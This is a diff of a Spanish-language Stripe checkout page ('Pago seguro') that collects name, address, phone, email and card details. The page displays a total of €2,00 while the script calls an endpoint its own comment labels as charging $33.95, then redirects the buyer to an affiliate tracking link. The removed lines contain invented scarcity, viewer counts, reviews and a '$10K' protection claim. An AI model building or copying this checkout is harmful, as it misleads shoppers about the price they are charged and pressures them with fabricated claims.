@@ -5,11 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <title>Pago seguro</title>
 
-  <!-- Google tag (unchanged) -->
+  <!-- Google Tag -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
+    function gtag(){ dataLayer.push(arguments); }
     gtag('js', new Date());
     gtag('config', 'G-FDQ6REQWS8', { send_page_view: true });
   </script>
@@ -18,95 +18,45 @@
     :root{
       --bg:#fafafa; --text:#0a2540; --muted:#5b6b82; --line:#e5e7eb; --card:#ffffff;
       --green:#18a957; --accent:#0f9d58; --accent2:#2dd4bf; --warn:#d30000;
-      --radius:14px;
     }
     *{box-sizing:border-box}
-    html,body{height:100%}
     body{
       margin:0; background:var(--bg); color:var(--text);
       font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
-      -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
     }
-
     .wrap{max-width:1100px; margin:0 auto; padding:18px 14px 60px}
-    .safe{background:#0a0a0a; color:#fff; font-size:12px; padding:6px 10px; text-align:left;}
+    .safe{background:#0a0a0a;color:#fff;font-size:12px;padding:6px 10px;}
 
-    .grid{
-      display:grid; grid-template-columns: minmax(0,1fr) 360px; gap:18px; align-items:start;
-    }
-    @media (max-width:980px){ .grid{ grid-template-columns:1fr } }
+    .grid{display:grid;grid-template-columns:minmax(0,1fr) 360px;gap:18px;}
+    @media(max-width:980px){.grid{grid-template-columns:1fr}}
 
-    .card{ background:var(--card); border:1px solid var(--line); border-radius:12px; padding:22px; }
+    .card{background:#fff;border:1px solid var(--line);border-radius:12px;padding:22px;}
+    .page-title{font-size:28px;font-weight:900;display:flex;gap:8px;align-items:center;}
 
-    .page-title{
-      font-size:28px; font-weight:900; display:flex; align-items:center; gap:8px; margin:6px 0 14px;
-    }
-    .stars{ color:#f6b80c; font-size:15px }
-    .reviews{ color:var(--muted); font-size:13px; margin-left:6px }
+    .h2{font-size:18px;font-weight:800;margin:10px 0 14px}
+    .label{font-weight:700;font-size:13px;margin-bottom:4px}
 
-    .h2{ font-size:18px; font-weight:800; margin:10px 0 14px }
-    .sub{ font-size:13px; color:#5b6b82; margin-top:-6px }
+    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+    @media(max-width:620px){.form-grid{grid-template-columns:1fr}}
+    .input,.select,.el{width:100%;padding:12px;border:1px solid #cfd6e4;border-radius:10px;font-size:15px}
 
-    .form-grid{ display:grid; grid-template-columns:1fr 1fr; gap:10px }
-    .form-grid-1{ display:grid; grid-template-columns:1fr; gap:10px }
-    @media (max-width:620px){ .form-grid{ grid-template-columns:1fr } }
+    .btn{width:100%;padding:14px;border:none;border-radius:12px;font-weight:900;background:#16a34a;color:#fff;font-size:16px;cursor:pointer;}
+    .btn.muted{background:#f1f4f8;color:#20324d;border:1px solid var(--line)}
 
-    .label{font-weight:700; font-size:13px; margin:4px 0 4px; color:#334}
-    .input, .select, .el{
-      width:100%; background:#fff; border:1px solid #cfd6e4; border-radius:10px; padding:12px; font-size:15px; outline:none;
-    }
-    .input::placeholder{ color:#8aa0b6 }
+    .logos{display:flex;gap:10px;margin-top:12px}
 
-    .btn{
-      width:100%; border:none; border-radius:12px; padding:12px 16px; font-weight:900; font-size:16px; cursor:pointer;
-      background:#16a34a; color:#fff;
-    }
-    .btn.muted{ background:#f1f4f8; color:#20324d; border:1px solid var(--line); }
-    .btn:disabled{opacity:.65; cursor:not-allowed}
+    .err{display:none;background:#fff1f1;border:1px solid #f5bcbc;color:#9a1a1a;padding:10px;border-radius:10px;font-size:14px;margin-top:10px}
+    .err[aria-hidden="false"]{display:block}
 
-    .logos{ display:flex; gap:10px; align-items:center; margin-top:12px }
-    .logos img{ height:20px; width:auto }
+    /* Step visibility */
+    .step{display:none}
+    .step[aria-hidden="false"]{display:block}
 
-    .err{ display:none; background:#fff1f1; border:1px solid #f5bcbc; color:#9a1a1a; padding:10px; border-radius:10px; font-size:14px; margin-top:10px }
-    .err[aria-hidden="false"]{ display:block }
-
-    .widget{ background:#fff; border:1px solid var(--line); border-radius:12px; padding:16px }
-    .widget + .widget{ margin-top:12px }
-    .w-title{ font-weight:800; font-size:16px; margin:2px 0 10px }
-    .order-row{ display:flex; justify-content:space-between; font-size:14px; padding:6px 0; border-top:1px dashed #e6eaf1 }
-    .order-row:first-of-type{ border-top:none }
-    .green{ color:var(--green) }
-
-    .delivery{
-      display:flex; align-items:center; gap:12px; border:1px dashed #d9e2ef; background:#f7fbff; padding:12px; border-radius:10px;
-    }
-    .delivery img{ width:52px; height:52px; border-radius:8px; object-fit:cover; border:1px solid #e6eaf1; background:#fff }
-    .tiny{ font-size:12px; color:var(--muted) }
-
-    .trust{ display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; text-align:center; }
-    .trust .box{ border:1px solid var(--line); border-radius:10px; padding:8px }
-    .trust .big{ font-weight:900; font-size:18px }
-    .trust .small{ font-size:12px; color:#5b6b82 }
-
-    .step{ display:none }
-    .step[aria-hidden="false"]{ display:block }
-
-    .el{ padding:10px 12px; border-radius:10px; border:1px solid #cfd6e4 }
-
-    .loading-overlay{
-      position:fixed; inset:0; background:rgba(246,249,252,.92);
-      display:none; align-items:center; justify-content:center; z-index:9999;
-    }
-    .loading-overlay[aria-hidden="false"]{ display:flex }
-    .loading-box{
-      width:min(92vw,460px); background:#fff; border:1px solid #e6edf5;
-      border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.06);
-      padding:20px; text-align:center; color:#2a3b55;
-    }
-    .loading-title{ font-weight:800; margin:2px 0 10px; font-size:18px }
-    .progress-wrap{ width:100%; height:10px; background:#ecf1f8; border-radius:999px; overflow:hidden; }
-    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg,#7aa3ff,#2dd4bf); animation: loadingBar 2.2s ease-in-out infinite; }
-    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
+    /* Loading overlay */
+    .loading-overlay{position:fixed;inset:0;background:rgba(246,249,252,.92);z-index:9999;
+      display:none;align-items:center;justify-content:center;}
+    .loading-overlay[aria-hidden="false"]{display:flex}
+    .loading-box{background:#fff;border:1px solid #e6edf5;padding:20px;border-radius:14px;text-align:center}
   </style>
 </head>
 
@@ -115,227 +65,191 @@
 
   <div class="wrap">
     <div class="page-title">
-      Pago seguro <span style="font-size:18px">🔒</span>
-      <span class="stars">★★★★★</span>
-      <span class="reviews">(2777 reseñas)</span>
+      Pago seguro 🔒 <span style="color:#f6b80c;font-size:15px">★★★★★</span>
+      <span style="color:#5b6b82;font-size:13px">(2777 reseñas)</span>
     </div>
 
     <div class="grid">
-      <!-- LEFT CARD -->
       <div class="card">
 
         <!-- STEP 1 -->
         <section id="step1" class="step" aria-hidden="false">
-          <div id="hero" style="display:none; margin-bottom:8px; display:flex; align-items:center; gap:10px">
-            <img id="heroImg" alt="" style="width:44px;height:44px;border-radius:8px;border:1px solid #e6eaf1;object-fit:cover">
-            <div id="heroTitle" style="font-weight:900"></div>
-          </div>
-
           <div class="h2">1. Información</div>
 
           <div class="form-grid">
             <div>
               <div class="label">Nombre</div>
-              <input id="firstName" class="input" placeholder="Ana">
+              <input class="input" id="firstName" placeholder="Ana">
             </div>
             <div>
               <div class="label">Apellidos</div>
-              <input id="lastName" class="input" placeholder="García">
+              <input class="input" id="lastName" placeholder="García">
             </div>
           </div>
 
           <div class="form-grid">
             <div style="grid-column:1 / -1">
               <div class="label">Dirección</div>
-              <input id="billingStreet" class="input" placeholder="Dirección (España)">
+              <input class="input" id="billingStreet" placeholder="Dirección (España)">
             </div>
             <div>
               <div class="label">Código postal</div>
-              <input id="billingPostcode" class="input" placeholder="Código postal">
+              <input class="input" id="billingPostcode">
             </div>
             <div>
               <div class="label">Ciudad</div>
-              <input id="billingCity" class="input" placeholder="Ciudad">
+              <input class="input" id="billingCity">
             </div>
           </div>
 
           <div class="form-grid">
             <div>
               <div class="label">Correo electrónico</div>
-              <input id="emailInput" class="input" placeholder="tu@ejemplo.com" type="email">
+              <input class="input" id="emailInput" type="email">
             </div>
             <div>
               <div class="label">País</div>
-              <input id="billingCountry" class="input" value="España" readonly>
+              <input class="input" id="billingCountry" value="España" readonly>
             </div>
           </div>
 
           <div class="form-grid">
             <div>
               <div class="label">Prefijo internacional</div>
-              <select id="phonePrefix" class="select"><option value="+34">+34 — España</option></select>
+              <select class="select" id="phonePrefix">
+                <option value="+34">+34 — España</option>
+              </select>
             </div>
             <div>
               <div class="label">Número de teléfono</div>
-              <input id="phoneNumber" class="input" placeholder="Tu número">
+              <input class="input" id="phoneNumber">
             </div>
           </div>
 
-          <input id="nameInput" class="input" style="display:none">
+          <input id="nameInput" style="display:none">
 
           <button id="nextBtn" class="btn">Continuar</button>
 
           <div class="logos">
-            <img src="/visa.png"><img src="mastercard.png"><img src="amex.png"><img src="discover.jpg">
+            <img src="/visa.png">
+            <img src="mastercard.png">
+            <img src="amex.png">
+            <img src="discover.jpg">
           </div>
         </section>
 
         <!-- STEP 2 -->
         <section id="step2" class="step" aria-hidden="true">
           <div class="h2">2. Pago</div>
-          <p class="sub">Tus datos se cifran y son procesados por Stripe.</p>
+          <p class="sub">Tus datos se procesan de forma segura mediante Stripe.</p>
 
-          <div class="form-grid-1">
+          <div>
+            <div class="label">Número de tarjeta</div>
+            <div id="card-number" class="el"></div>
+          </div>
+
+          <div class="form-grid">
             <div>
-              <div class="label">Número de tarjeta</div>
-              <div id="card-number" class="el"></div>
+              <div class="label">Vencimiento</div>
+              <div id="card-expiry" class="el"></div>
             </div>
-            <div class="form-grid">
-              <div>
-                <div class="label">Vencimiento</div>
-                <div id="card-expiry" class="el"></div>
-              </div>
-              <div>
-                <div class="label">CVC</div>
-                <div id="card-cvc" class="el"></div>
-              </div>
+            <div>
+              <div class="label">CVC</div>
+              <div id="card-cvc" class="el"></div>
             </div>
           </div>
 
           <div id="err" class="err" aria-hidden="true"></div>
 
-          <div style="display:flex; gap:10px; margin-top:12px">
-            <button id="backBtn" class="btn muted" style="width:40%">← Volver</button>
-            <button id="payNow" class="btn" style="width:60%">Pagar de forma segura</button>
+          <div style="display:flex;gap:10px;margin-top:12px">
+            <button id="backBtn" class="btn muted">← Volver</button>
+            <button id="payNow" class="btn">Pagar de forma segura</button>
           </div>
-
-          <p class="sub" style="text-align:center; margin-top:10px">🔒 SSL 256-bit · Stripe</p>
         </section>
+
       </div>
 
       <!-- SIDEBAR -->
       <aside>
-        <div class="widget">
-          <div class="w-title" style="text-align:center">Lo que opinan nuestros clientes</div>
-          <div style="text-align:center; font-weight:700">Fenella Lara</div>
-          <div style="text-align:center; color:#f6b80c">★★★★★</div>
-          <p class="tiny" style="text-align:center">
-            ¡Envío rápido y atención excelente!
-          </p>
-        </div>
-
-        <div class="widget">
-          <div class="delivery">
-            <img id="sidebarImg">
-            <div><div style="font-weight:800">Envío rápido</div><div class="tiny">3–5 días</div></div>
-            <div style="margin-left:auto; font-weight:800">Gratis</div>
-          </div>
-
-          <div class="w-title" style="margin-top:14px">Resumen</div>
-          <div class="order-row"><span>Total</span><span id="orderTotal">€2,00</span></div>
-
-          <div class="tiny" style="margin-top:10px; line-height:1.5">
-            🗃️ Solo quedan 13<br>
-            👀 31 personas mirando ahora<br>
-            ✅ J****s lo compró hace 10 min<br>
-            💳 715 ventas en 7 días
-          </div>
-        </div>
-
-        <div class="widget">
-          <div class="w-title">Tienda segura</div>
-          <div class="trust">
-            <div class="box"><div class="big">99%</div><div class="small">Clientes felices</div></div>
-            <div class="box"><div class="big">Seguro</div><div class="small">SSL</div></div>
-            <div class="box"><div class="big">$10K</div><div class="small">Protección</div></div>
+        <div class="card">
+          <div class="h2">Resumen</div>
+          <div class="order-row" style="display:flex;justify-content:space-between;font-size:16px">
+            <span>Total</span>
+            <strong id="orderTotal">€2,00</strong>
           </div>
         </div>
       </aside>
     </div>
   </div>
 
-  <!-- Loading -->
+  <!-- LOADING -->
   <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
     <div class="loading-box">
-      <div class="loading-title">Procesando tu pago…</div>
-      <div class="progress-wrap"><div class="progress-bar"></div></div>
-      <p class="sub">Por favor espera…</p>
+      <h3>Procesando tu pago…</h3>
+      <p>Por favor espera…</p>
     </div>
   </div>
 
   <!-- Stripe.js -->
   <script src="https://js.stripe.com/v3"></script>
+
   <script>
-  window.addEventListener("DOMContentLoaded", () => {
+  document.addEventListener("DOMContentLoaded", () => {
 
-    const SUBSCRIBE_URL = "/api/stripe/one-time-33-95";  /* <<< CORRECT ENDPOINT ($33.95) */
-    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    /* Correct Stripe publishable key (KEY 2) */
+    const PUBLISHABLE_KEY =
+      "pk_live_51SaxeyEV8OvsGiVpMTahrMGQMjZMXD1neiFffQPrybev0TQNcxvVaixH5TfQKzDBNKxLIqcuAgQ1ynYPWXe792D500VQ7Gcw6t";
 
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const nextBtn = document.getElementById('nextBtn');
-    const backBtn = document.getElementById('backBtn');
-    const errBox = document.getElementById('err');
-    const overlay = document.getElementById('loading-overlay');
+    /* Correct backend endpoint ($33.95) */
+    const SUBSCRIBE_URL = "/api/stripe/one-time-33-95";
 
-    const firstName = document.getElementById('firstName');
-    const lastName  = document.getElementById('lastName');
-    const nameInput = document.getElementById('nameInput');
+    /* DOM */
+    const step1 = document.getElementById("step1");
+    const step2 = document.getElementById("step2");
+    const nextBtn = document.getElementById("nextBtn");
+    const backBtn = document.getElementById("backBtn");
+    const errBox = document.getElementById("err");
+    const overlay = document.getElementById("loading-overlay");
 
-    const phonePrefix = document.getElementById('phonePrefix');
-    const phoneNumber = document.getElementById('phoneNumber');
+    const firstName = document.getElementById("firstName");
+    const lastName = document.getElementById("lastName");
+    const nameInput = document.getElementById("nameInput");
+    const emailInput = document.getElementById("emailInput");
 
-    const billingStreet = document.getElementById('billingStreet');
-    const billingCity = document.getElementById('billingCity');
-    const billingPostcode = document.getElementById('billingPostcode');
-    const billingCountry = document.getElementById('billingCountry');
-    const orderTotal = document.getElementById('orderTotal');
-    const sidebarImg = document.getElementById('sidebarImg');
+    const phonePrefix = document.getElementById("phonePrefix");
+    const phoneNumber = document.getElementById("phoneNumber");
 
-    orderTotal.textContent = "€2,00";
+    const billingStreet = document.getElementById("billingStreet");
+    const billingCity = document.getElementById("billingCity");
+    const billingPostcode = document.getElementById("billingPostcode");
 
-    function show(o){ o.setAttribute("aria-hidden","false"); }
-    function hide(o){ o.setAttribute("aria-hidden","true"); }
-    function showLoading(){ overlay.style.display='flex'; overlay.setAttribute('aria-hidden','false'); }
-    function hideLoading(){ overlay.setAttribute('aria-hidden','true'); overlay.style.display='none'; }
+    nextBtn.onclick = () => {
+      nameInput.value = (firstName.value + " " + lastName.value).trim();
+      step1.setAttribute("aria-hidden","true");
+      step2.setAttribute("aria-hidden","false");
+    };
 
-    nextBtn.addEventListener("click", () => {
-      nameInput.value = `${firstName.value} ${lastName.value}`.trim();
-      hide(step1); show(step2);
-    });
+    backBtn.onclick = () => {
+      step1.setAttribute("aria-hidden","false");
+      step2.setAttribute("aria-hidden","true");
+    };
 
-    backBtn.addEventListener("click", () => {
-      hide(step2); show(step1);
-    });
+    /* Stripe setup */
+    const stripe = Stripe(PUBLISHABLE_KEY);
+    const elements = stripe.elements();
 
-    /* Stripe init */
-    let stripe = Stripe(PUBLISHABLE_KEY);
-    let elements = stripe.elements();
-    let cardNumber = elements.create("cardNumber");
-    let cardExpiry = elements.create("cardExpiry");
-    let cardCvc    = elements.create("cardCvc");
+    const cardNumber = elements.create("cardNumber");
+    const cardExpiry = elements.create("cardExpiry");
+    const cardCvc = elements.create("cardCvc");
 
     cardNumber.mount("#card-number");
     cardExpiry.mount("#card-expiry");
     cardCvc.mount("#card-cvc");
 
-    document.getElementById("payNow").addEventListener("click", async () => {
-      errBox.textContent = ""; errBox.setAttribute("aria-hidden","true");
-      showLoading();
+    document.getElementById("payNow").onclick = async () => {
 
-      const name = nameInput.value.trim();
-      const email = document.getElementById("emailInput").value.trim();
-      const phone = (phonePrefix.value + phoneNumber.value.replace(/\D/g,""));
+      errBox.setAttribute("aria-hidden","true");
+      overlay.setAttribute("aria-hidden","false");
 
       const address = {
         line1: billingStreet.value.trim(),
@@ -344,48 +258,73 @@
         country: "ES"
       };
 
-      try {
-        const pm = await stripe.createPaymentMethod({
-          type: "card",
-          card: cardNumber,
-          billing_details: { name, email, phone, address }
-        });
+      const pm = await stripe.createPaymentMethod({
+        type: "card",
+        card: cardNumber,
+        billing_details:{
+          name: nameInput.value,
+          email: emailInput.value.trim(),
+          phone: phonePrefix.value + phoneNumber.value.replace(/\D/g,""),
+          address
+        }
+      });
 
-        if(pm.error) throw new Error(pm.error.message);
-
-        const res = await fetch(SUBSCRIBE_URL, {
-          method: "POST",
-          headers: {"Content-Type":"application/json"},
-          body: JSON.stringify({
-            paymentMethodId: pm.paymentMethod.id,
-            name, email, phone, address
-          })
-        });
-
-        const data = await res.json();
-        if(!data.clientSecret) throw new Error(data.error || "No se pudo iniciar el pago");
-
-        const conf = await stripe.confirmCardPayment(data.clientSecret);
-        if(conf.error) throw new Error(conf.error.message);
-        if(conf.paymentIntent.status !== "succeeded")
-          throw new Error("Pago no completado");
-
-        /* SUCCESS → redirect to your tracker */
-        const TRACKER_URL = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7";
-        let qp = new URLSearchParams();
-        qp.set("v", conf.paymentIntent.id);
-        window.location.href = TRACKER_URL + "?" + qp.toString();
-
-      } catch(err) {
-        errBox.textContent = err.message;
+      if(pm.error){
+        errBox.textContent = pm.error.message;
         errBox.setAttribute("aria-hidden","false");
-        hideLoading();
-        window.location.href = "https://www.united-defence-shield.com/7GQSPJ/27CC71Q";
+        overlay.setAttribute("aria-hidden","true");
+        return;
       }
-    });
+
+      const response = await fetch(SUBSCRIBE_URL,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          paymentMethodId: pm.paymentMethod.id,
+          name: nameInput.value,
+          email: emailInput.value.trim(),
+          phone: phonePrefix.value + phoneNumber.value.replace(/\D/g,""),
+          address
+        })
+      });
+
+      const data = await response.json();
+
+      if(!data.clientSecret){
+        errBox.textContent = data.error || "Error al iniciar el pago.";
+        errBox.setAttribute("aria-hidden","false");
+        overlay.setAttribute("aria-hidden","true");
+        return;
+      }
+
+      const conf = await stripe.confirmCardPayment(data.clientSecret);
+
+      if(conf.error){
+        errBox.textContent = conf.error.message;
+        errBox.setAttribute("aria-hidden","false");
+        overlay.setAttribute("aria-hidden","true");
+        return;
+      }
+
+      if(conf.paymentIntent.status !== "succeeded"){
+        errBox.textContent = "El pago no se completó.";
+        errBox.setAttribute("aria-hidden","false");
+        overlay.setAttribute("aria-hidden","true");
+        return;
+      }
+
+      /* SUCCESS → TRACKER */
+      const TRACKER_URL =
+        "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7";
+
+      const qp = new URLSearchParams();
+      qp.set("v", conf.paymentIntent.id);
+
+      window.location.href = TRACKER_URL + "?" + qp.toString();
+    };
+
   });
   </script>
 
-  <script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
 </body>
 </html>
